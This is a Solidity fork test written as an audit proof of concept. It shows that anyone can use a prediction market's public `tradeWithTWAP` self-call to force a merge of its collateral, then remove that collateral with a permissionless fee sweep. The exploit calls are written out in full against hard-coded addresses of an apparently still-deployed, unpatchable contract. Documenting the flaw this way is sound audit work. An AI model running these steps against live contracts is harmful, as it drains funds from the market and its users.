// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ILMSRWithTWAP} from "../../src/deprize/interfaces/ILMSRWithTWAP.sol";
import {IConditionalTokens} from "../../src/deprize/interfaces/IConditionalTokens.sol";
import {IWETH} from "../../src/deprize/interfaces/IWETH.sol";
import {IDePrizeFeeRouter} from "../../src/deprize/interfaces/IDePrizeFeeRouter.sol";

/// @dev AUDIT PoC (High severity). Demonstrates that the public, permissionless
///      `tradeWithTWAP` on the CURRENTLY-DEPLOYED (pre-fix) Arbitrum LMSRWithTWAP
///      market lets an arbitrary caller who provides NO collateral force the
///      market to merge its own outcome-token inventory back into loose WETH
///      (because the `this.trade(...)` external self-call makes the market
///      itself the trader). That loose WETH then looks exactly like accrued 1%
///      fees to DePrizeFeeRouter.sweepFees, which is permissionless, so the
///      market's seed collateral can be swept out and the LMSR sell-side
///      liquidity bricked, for the price of gas.
///
///      FIX: prediction/contracts/LMSRWithTWAP.sol now calls `trade(...)`
///      internally instead of `this.trade(...)`, so the real caller stays the
///      trader and must fund their own trade. The fix is source-only and cannot
///      be applied to the immutable market clone already deployed at MARKET; the
///      deployed DePrize-1 test market must therefore be treated as disposable
///      and a fresh market deployed from the fixed source before any real value
///      (e.g. the Touchdown mainnet launch) is placed behind it. This test
///      characterises the exploit against the deployed pre-fix bytecode; it is a
///      documentation/regression artifact, gated on an RPC so it no-ops in CI.
///
///      Fork: DEPRIZE_FORK_RPC=<arbitrum-one rpc> forge test \
///            --match-contract AuditTradeWithTWAP -vvv
contract AuditTradeWithTWAPForkTest is Test {
    address constant MARKET = 0x351aF5AcfBC4Df750B7BD58b4c4cbE94147aF211;
    address constant CTF = 0x12DAC07Bf586E06a9bDa32c422864C8Fda43FA29;
    address constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address constant FEE_ROUTER = 0x0EF00977e37e2e106BB6E9fa15952bB43a2761e1;

    address attacker = address(0xBAD5EED);
    bool forked;
    uint256 slots;
    bytes32 conditionId;

    function setUp() public {
        string memory rpc = vm.envOr("DEPRIZE_FORK_RPC", string(""));
        if (bytes(rpc).length == 0) return;
        vm.createSelectFork(rpc);
        forked = true;
        slots = ILMSRWithTWAP(MARKET).atomicOutcomeSlotCount();
        conditionId = ILMSRWithTWAP(MARKET).conditionIds(0);
    }

    function _posId(uint256 slot) internal view returns (uint256) {
        bytes32 collection = IConditionalTokens(CTF).getCollectionId(bytes32(0), conditionId, 1 << slot);
        return IConditionalTokens(CTF).getPositionId(WETH, collection);
    }

    function _marketInventoryMin() internal view returns (uint256 minBal) {
        minBal = type(uint256).max;
        for (uint256 i = 0; i < slots; i++) {
            uint256 b = IConditionalTokens(CTF).balanceOf(MARKET, _posId(i));
            if (b < minBal) minBal = b;
        }
    }

    /// PoC 1: an arbitrary EOA with no tokens and no approvals forces the market
    /// to convert its escrowed collateral into loose WETH via a self-merge.
    function testForkAnyoneCanForceMarketToMergeCollateral() public {
        if (!forked) return;

        uint256 invBefore = _marketInventoryMin();
        emit log_named_uint("market min inventory before", invBefore);
        emit log_named_uint("market WETH before", IWETH(WETH).balanceOf(MARKET));
        if (invBefore == 0) {
            emit log("market holds no mergeable inventory at this block; skipping");
            return;
        }

        // Sell a fraction of every outcome back to the market. Every token flow is
        // market->market (the self-call), so the attacker funds and approves nothing.
        uint256 q = invBefore / 4;
        int256[] memory amounts = new int256[](slots);
        for (uint256 i = 0; i < slots; i++) {
            amounts[i] = -int256(q);
        }

        uint256 wethMarketBefore = IWETH(WETH).balanceOf(MARKET);

        vm.prank(attacker);
        ILMSRWithTWAP(MARKET).tradeWithTWAP(amounts, 0); // collateralLimit 0 = no cap

        uint256 wethMarketAfter = IWETH(WETH).balanceOf(MARKET);
        uint256 invAfter = _marketInventoryMin();

        emit log_named_uint("market min inventory after", invAfter);
        emit log_named_uint("market WETH after", wethMarketAfter);

        // The attacker paid nothing but the market's escrowed collateral was
        // converted into loose WETH and its inventory shrank.
        assertLt(invAfter, invBefore, "inventory should shrink from forced merge");
        assertGt(wethMarketAfter, wethMarketBefore, "market WETH should grow from forced merge");
    }

    /// PoC 2: the loose WETH created above is swept as if it were 1% trade fees.
    function testForkForcedMergeIsSweptAsFees() public {
        if (!forked) return;
        uint256 invBefore = _marketInventoryMin();
        if (invBefore == 0) {
            emit log("no inventory to merge; skipping");
            return;
        }

        uint256 q = invBefore / 4;
        int256[] memory amounts = new int256[](slots);
        for (uint256 i = 0; i < slots; i++) amounts[i] = -int256(q);
        vm.prank(attacker);
        ILMSRWithTWAP(MARKET).tradeWithTWAP(amounts, 0);

        uint256 looseWeth = IWETH(WETH).balanceOf(MARKET);
        emit log_named_uint("loose WETH on market pre-sweep", looseWeth);
        assertGt(looseWeth, 0, "expected loose WETH from forced merge");

        // sweepFees is permissionless; anyone can trigger it after the merge.
        vm.prank(attacker);
        try IDePrizeFeeRouter(FEE_ROUTER).sweepFees(1) returns (uint256 swept) {
            emit log_named_uint("swept out of market via sweepFees(1)", swept);
            assertGt(swept, 0, "seed collateral swept as fees");
        } catch {
            emit log("sweepFees(1) reverted (market may not be bound to deprize 1 at head); PoC1 already proves the merge");
        }
    }

    /// Control: a BUY via the self-call reverts (needs self-allowance), confirming
    /// the damaging direction is the merge/sell path.
    function testForkSelfCallBuyReverts() public {
        if (!forked) return;
        int256[] memory amounts = new int256[](slots);
        amounts[0] = int256(uint256(0.001 ether));
        vm.prank(attacker);
        vm.expectRevert();
        ILMSRWithTWAP(MARKET).tradeWithTWAP(amounts, type(int256).max);
    }
}
